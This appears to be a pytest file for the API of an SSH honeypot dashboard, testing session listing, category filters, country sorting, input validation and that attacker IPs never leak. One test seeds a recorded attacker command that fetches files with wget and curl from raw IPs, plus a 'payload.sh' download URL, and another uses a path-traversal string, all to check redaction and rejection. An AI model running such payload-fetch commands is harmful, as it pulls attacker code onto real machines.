import json
from datetime import datetime, timezone
from typing import Any

from src.models.command import Command
from src.models.download import Download
from src.models.geo_location import GeoLocation
from src.models.session import Session as HoneypotSession


def test_list_sessions(client: Any, seed_data: Any) -> None:
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    data = response.get_json()
    assert "items" in data
    assert "meta" in data
    assert data["meta"]["total"] == 2
    assert len(data["items"]) == 2


def test_list_sessions_no_src_ip_leak(client: Any, seed_data: Any) -> None:
    """Privacy contract: `src_ip` must never appear in list responses."""
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    assert b"src_ip" not in response.data
    for s in response.get_json()["items"]:
        assert "src_ip" not in s
        assert "country_code" in s
        assert "country" in s


def test_list_sessions_summary_classification_fields(
    client: Any, seed_data: Any
) -> None:
    """Summaries expose command_count + has_successful_login for classification."""
    del seed_data
    response = client.get("/api/v1/sessions/")
    assert response.status_code == 200
    by_id = {s["id"]: s for s in response.get_json()["items"]}
    # sess-001: 2 failed auths, 1 command -> "active", login never succeeded.
    assert by_id["sess-001"]["command_count"] == 1
    assert by_id["sess-001"]["has_successful_login"] is False
    assert by_id["sess-001"]["auth_attempt_count"] == 2
    # sess-002: 1 successful auth, no commands -> "login".
    assert by_id["sess-002"]["command_count"] == 0
    assert by_id["sess-002"]["has_successful_login"] is True
    # The server-assigned category (single source of truth) is exposed too.
    assert by_id["sess-001"]["category"] == "active"
    assert by_id["sess-002"]["category"] == "login"


def test_category_field_agrees_with_filter(
    client: Any, seed_data: Any, failed_and_probe_seed: Any
) -> None:
    """The serialized `category` must match the SQL `?category=` filter for every
    class - guards the two from drifting (they encode the same partition)."""
    del seed_data, failed_and_probe_seed
    for cat in ("active", "login", "failed", "probe"):
        items = client.get(f"/api/v1/sessions/?category={cat}").get_json()["items"]
        assert items, f"expected at least one {cat} session"
        assert all(s["category"] == cat for s in items), cat


def test_list_sessions_category_active(client: Any, seed_data: Any) -> None:
    """sess-001 ran a command, so it classifies as 'active' (commands win)."""
    del seed_data
    response = client.get("/api/v1/sessions/?category=active")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["sess-001"]


def test_list_sessions_category_login(client: Any, seed_data: Any) -> None:
    """sess-002 had a successful login but no commands -> 'login'."""
    del seed_data
    response = client.get("/api/v1/sessions/?category=login")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["sess-002"]


def test_list_sessions_category_failed_and_probe(
    client: Any, seed_data: Any, failed_and_probe_seed: Any
) -> None:
    """'failed' = login attempts made, none accepted, no commands.
    'probe'  = a bare connection with no auth attempts at all."""
    del seed_data, failed_and_probe_seed
    failed = client.get("/api/v1/sessions/?category=failed").get_json()
    assert [s["id"] for s in failed["items"]] == ["failsess001"]
    probe = client.get("/api/v1/sessions/?category=probe").get_json()
    assert [s["id"] for s in probe["items"]] == ["probesess01"]


def test_list_sessions_filter_country(client: Any, seed_data: Any) -> None:
    """Only sess-001 is geo-enriched (US); sess-002 has no geo row."""
    del seed_data
    response = client.get("/api/v1/sessions/?country=US")
    assert response.status_code == 200
    data = response.get_json()
    assert [s["id"] for s in data["items"]] == ["sess-001"]


def test_list_sessions_sort_country_puts_nulls_last(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?sort=country")
    assert response.status_code == 200
    ids = [s["id"] for s in response.get_json()["items"]]
    # US (sess-001) ahead of the geo-less sess-002 (NULL country sorts last).
    assert ids == ["sess-001", "sess-002"]


def test_list_sessions_sort_country_alphabetical_two_countries(
    client: Any, seed_data: Any, db_session: Any
) -> None:
    """Two geo-enriched countries exercise the A-Z primary ordering (the seed
    only has US-vs-NULL, so a reversed sort would still pass without this)."""
    del seed_data
    now = datetime.now(timezone.utc)
    db_session.add(
        HoneypotSession(
            id="ausess00001",
            src_ip="198.51.100.5",
            src_port=3,
            dst_port=22,
            protocol="ssh",
            started_at=now,
        )
    )
    db_session.add(
        GeoLocation(ip="198.51.100.5", country_code="AU", country="Australia")
    )
    db_session.flush()

    ids = [
        s["id"]
        for s in client.get("/api/v1/sessions/?sort=country").get_json()["items"]
    ]
    # Australia precedes United States; the geo-less sess-002 (NULL) sorts last.
    assert ids.index("ausess00001") < ids.index("sess-001") < ids.index("sess-002")


def test_list_sessions_sort_active_orders_by_command_count(
    client: Any, seed_data: Any
) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/?sort=active")
    assert response.status_code == 200
    ids = [s["id"] for s in response.get_json()["items"]]
    # sess-001 (1 command) ahead of sess-002 (0 commands).
    assert ids == ["sess-001", "sess-002"]


def test_list_sessions_category_and_country_compose(
    client: Any, seed_data: Any
) -> None:
    """category + country AND together: sess-001 is active and US -> matches."""
    del seed_data
    response = client.get("/api/v1/sessions/?category=active&country=US")
    assert response.status_code == 200
    assert [s["id"] for s in response.get_json()["items"]] == ["sess-001"]
    # sess-002 is 'login' (not active) so an active+US filter excludes it.
    response = client.get("/api/v1/sessions/?category=login&country=US")
    assert response.get_json()["meta"]["total"] == 0


def test_list_sessions_rejects_invalid_filters(client: Any) -> None:
    assert client.get("/api/v1/sessions/?sort=bogus").status_code == 422
    assert client.get("/api/v1/sessions/?category=maybe").status_code == 422
    assert client.get("/api/v1/sessions/?country=USA").status_code == 422


def test_list_sessions_filters_no_src_ip_leak(client: Any, seed_data: Any) -> None:
    """Privacy contract holds across the filtered/sorted code paths too."""
    del seed_data
    response = client.get("/api/v1/sessions/?category=login&sort=country")
    assert response.status_code == 200
    assert b"src_ip" not in response.data


def test_session_detail_redacts_ips_in_commands_and_downloads(
    client: Any, db_session: Any
) -> None:
    """C2 / payload IPs an attacker typed must be blotted server-side, so the raw
    IP never reaches the API response (nor /redoc, /swagger, or a direct curl)."""
    now = datetime.now(timezone.utc)
    db_session.add(
        HoneypotSession(
            id="sessIP00001",
            src_ip="203.0.113.50",
            src_port=4,
            dst_port=22,
            protocol="ssh",
            started_at=now,
        )
    )
    db_session.flush()
    db_session.add(
        Command(
            session_id="sessIP00001",
            input="wget https://34.11.136.102/x; curl http://2130706433/y",
            success=True,
            timestamp=now,
        )
    )
    db_session.add(
        Download(
            session_id="sessIP00001",
            url="http://185.220.101.5:8080/payload.sh",
            outfile="downloads/p",
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            timestamp=now,
        )
    )
    db_session.flush()

    response = client.get("/api/v1/sessions/sessIP00001")
    assert response.status_code == 200
    # No IP literal of any kind survives in the raw response bytes.
    for leaked in (b"34.11.136.102", b"2130706433", b"185.220.101.5"):
        assert leaked not in response.data, leaked
    body = response.get_json()
    assert "‹ip›" in body["commands"][0]["input"]
    assert "‹ip›" in body["downloads"][0]["url"]


def test_get_session_not_found(client: Any) -> None:
    response = client.get("/api/v1/sessions/nonexistent")
    assert response.status_code == 404
    data = response.get_json()
    # flask_smorest abort(404, message=...) produces {code, status, message}
    assert "message" in data or "errors" in data


def test_get_session_detail_with_seed_id(client: Any, seed_data: Any) -> None:
    del seed_data
    response = client.get("/api/v1/sessions/sess-001")
    assert response.status_code == 200
    body = response.get_json()
    assert body["id"] == "sess-001"
    assert "src_ip" not in body


def test_get_session_malformed_id(client: Any) -> None:
    response = client.get("/api/v1/sessions/..%2F..%2Fetc")
    assert response.status_code in (404, 422)


def test_session_detail_no_src_ip_leak(
    client: Any, seed_data: Any, db_session: Any
) -> None:
    """Privacy contract: `src_ip` must never appear in detail responses.

    Seeded ids contain hyphens (rejected by the route's regex), so we insert a
    matching-pattern session for this assertion.
    """
    db_session.add(
        HoneypotSession(
            id="sessAAA001",
            src_ip="203.0.113.7",
            src_port=44444,
            dst_port=22,
            protocol="ssh",
            started_at=datetime.now(timezone.utc),
        )
    )
    db_session.flush()

    response = client.get("/api/v1/sessions/sessAAA001")
    assert response.status_code == 200
    assert b"src_ip" not in response.data
    body = response.get_json()
    assert "src_ip" not in body
    assert "country_code" in body
    assert "country" in body


def test_per_page_is_capped(client: Any, seed_data: Any) -> None:
    # per_page > 100 fails marshmallow validate.Range(max=100), surfacing 422
    response = client.get("/api/v1/sessions/?per_page=99999")
    assert response.status_code == 422


def test_sessions_invalid_page_returns_422(client: Any) -> None:
    response = client.get("/api/v1/sessions/?page=abc")
    assert response.status_code == 422
    data = response.get_json()
    assert "errors" in data or "code" in data


def test_sessions_invalid_session_id_returns_422(client: Any) -> None:
    response = client.get("/api/v1/sessions/!!!")
    assert response.status_code == 422


def test_sessions_unknown_session_id_returns_404(client: Any) -> None:
    response = client.get("/api/v1/sessions/aaaaaaaa")
    assert response.status_code == 404
    data = response.get_json()
    blob = (data.get("message") or "") + json.dumps(data)
    assert "Session" in blob or "aaaaaaaa" in blob


def test_session_detail_geo_enriched(client: Any, seed_data: Any) -> None:
    """A geo-enriched session exposes country/country_code, never src_ip.

    Exercises the populated GeoLocation join branch (seed gives sess-001 a US
    geo row) that the privacy gate would otherwise never cover.
    """
    del seed_data
    response = client.get("/api/v1/sessions/sess-001")
    assert response.status_code == 200
    assert b"src_ip" not in response.data
    body = response.get_json()
    assert body["country"] == "United States"
    assert body["country_code"] == "US"
    assert "src_ip" not in body
